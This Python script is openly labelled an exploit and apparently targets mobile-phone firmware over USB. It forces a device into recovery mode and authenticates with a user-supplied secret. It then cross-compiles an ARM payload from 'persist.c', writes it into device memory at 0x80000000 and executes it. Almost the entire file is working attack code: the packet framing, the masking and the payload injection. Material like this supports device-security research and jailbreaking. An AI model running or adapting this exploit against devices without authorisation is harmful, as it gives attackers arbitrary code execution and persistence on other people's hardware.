import usb.core
import usb.util
import struct
import random
import sys
import time
import argparse
import os
import tempfile
import subprocess
from tqdm import tqdm


PAYLOAD_PATH = os.path.dirname(os.path.realpath(__file__))
LINKER = """
ENTRY(start)

SECTIONS
{
  . = BASE;

  .text     : { *(.text.start) *(.text   .text.*   .gnu.linkonce.t.*) }
  .rodata   : { *(.rodata .rodata.* .gnu.linkonce.r.*) }
  .bss      : { *(.bss    .bss.*    .gnu.linkonce.b.*) *(COMMON) }
  .data     : { *(.data   .data.*   .gnu.linkonce.d.*) }
  /DISCARD/ : { *(.interp) *(.dynsym) *(.dynstr) *(.hash) *(.dynamic) *(.comment) }
}
"""

CC = ["arm-none-eabi-gcc", "-c", "-Os", "-marm", "-mcpu=cortex-a8", "-fno-builtin-printf", "-fno-strict-aliasing", "-fno-builtin-memcpy", "-fno-builtin-memset", "-fno-builtin", "-I", PAYLOAD_PATH]
AS = ["arm-none-eabi-as", "-c"]
LD = ["arm-none-eabi-gcc", "-nodefaultlibs", "-nostdlib"]
OBJCOPY = ["arm-none-eabi-objcopy", "-O", "binary"]


class PayloadBuilder:

    def __init__(self, srcfile):
        self.ext = "c"
        if srcfile.endswith(".S"):
            self.ext = "S"
        with open(os.path.join(PAYLOAD_PATH, srcfile)) as inf:
            self.src = inf.read()

    def build(self, **kwargs):
        base = kwargs["base"]
        src = self.src
        for arg, replacement in kwargs.items():
            src = src.replace("%{}%".format(arg), str(replacement))

        with tempfile.TemporaryDirectory() as tmp:
            p_linker_x = os.path.join(tmp, "linker.x")
            p_payload_src = os.path.join(tmp, "payload.{}".format(self.ext))
            p_payload_o = os.path.join(tmp, "payload.o")
            p_payload = os.path.join(tmp, "payload")
            p_payload_bin = os.path.join(tmp, "payload.bin")

            with open(p_linker_x, "w") as outf:
                outf.write(LINKER.replace("BASE", hex(base)))
            with open(p_payload_src, "w") as outf:
                outf.write(src)
            if self.ext == "c":
                subprocess.check_output(CC + ["-o", p_payload_o, p_payload_src])
            elif self.ext == "S":
                subprocess.check_output(AS + ["-o", p_payload_o, p_payload_src])
            subprocess.check_output(LD + ["-T", p_linker_x, "-o", p_payload, p_payload_o, "-lgcc"])
            subprocess.check_output(OBJCOPY + [p_payload, p_payload_bin])
            with open(p_payload_bin, "rb") as inf:
                payload = inf.read()
        return payload


def mask_payload(buf):
    output = []
    for ch in buf:
        if ch in [0xF0, 0xFF, 0xFE]:
            output.append(0xF0)
            output.append(ch ^ 0x10)
        else:
            output.append(ch)
    output += [0xF0, 0xF0]
    return bytes(output)


def mask_packet(pkt):
    out = [0xFF]
    ck = 0
    for b in pkt:
        if b in [0xFD, 0xFE, 0xFF]:
            out.append(0xFD)
            out.append(b ^ 0x10)
        else:
            out.append(b)
        ck += b
    ck = (-ck) & 0xFF
    if ck in [0xFD, 0xFE, 0xFF]:
        out.append(0xFD)
        out.append(ck ^ 0x10)
    else:
        out.append(ck)
    out.append(0xFE)

    return bytearray(out)


def make_packet(cmd, subcmd, variable_payload=None):
    if variable_payload is None:
        variable_payload = b""
    packet = struct.pack("<BBBHBBBB", 0xE9, 0xE3, 0x42, 6 + len(variable_payload), 0, 0, cmd, subcmd) + variable_payload
    return mask_packet(packet)


def unmask_resp(resp):
    assert resp[0] == 0xFF
    assert resp[-1] == 0xFE
    resp = resp[1:-1]
    out = []
    x = 0
    while x < len(resp):
        if resp[x] == 0xFD:
            out.append(resp[x+1] ^ 0x10)
            x += 2
        else:
            out.append(resp[x])
            x += 1
    return bytearray(out)


def checksum2(data):
    s = 0
    for x in range(0, len(data), 2):
        s += struct.unpack("<H", data[x:x+2])[0]
    return struct.pack("<H", (-s) & 0xFFFF)


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--secret', type=str, required=True)

        self.args = parser.parse_args()
        self.secret = bytes.fromhex(self.args.secret)

    def comm_oneway(self, cmd, subcmd=0, variable_payload=None):
        pkt = make_packet(cmd, subcmd, variable_payload)
        ret = self.dev.write(0x8, pkt)

    def comm(self, cmd, subcmd=0, variable_payload=None):
        self.comm_oneway(cmd, subcmd, variable_payload)
        resp = b""
        while True:
            resp += self.dev.read(0x87, 64)
            if resp.endswith(b"\xFE"):
                break
        return unmask_resp(resp)

    def cmd_write(self, addr, data):
        self.comm_oneway(4, variable_payload=struct.pack("<IH", addr, len(data)) + data)

    def cmd_exec(self):
        self.comm(3, variable_payload=b"\x01")

    def run(self):
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        # go into serial comms mode => turns green led on for some, display on
        print("Enter recovery mode")
        self.dev.ctrl_transfer(0x41, 0x60, 0x60, 2)
        self.dev.read(0x86, 64)

        # some devices e.g. n-02c need delay/reinit before it can be used
        print("Wait 3s...")
        time.sleep(3)
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)

        print("Authentication")
        user_buffer = self.secret + checksum2(self.secret) + b"\x00" * 0x20
        self.comm_oneway(0x13, subcmd=2, variable_payload=user_buffer)
        self.comm(3, variable_payload=b"\x22")

        payload = PayloadBuilder("persist.c").build(base=0x80000000)
        while len(payload) % 4 != 0:
            payload += b"\x00"
        print("Transmit payload, size=0x{:X}".format(len(payload)))
        for x in range(0, len(payload), 64):
            self.cmd_write(0x80000000 + x, payload[x:x+64])

        print("Execute payload")
        self.cmd_exec()


def main():
    e = Exploit()
    e.run()


if __name__ == "__main__":
    main()
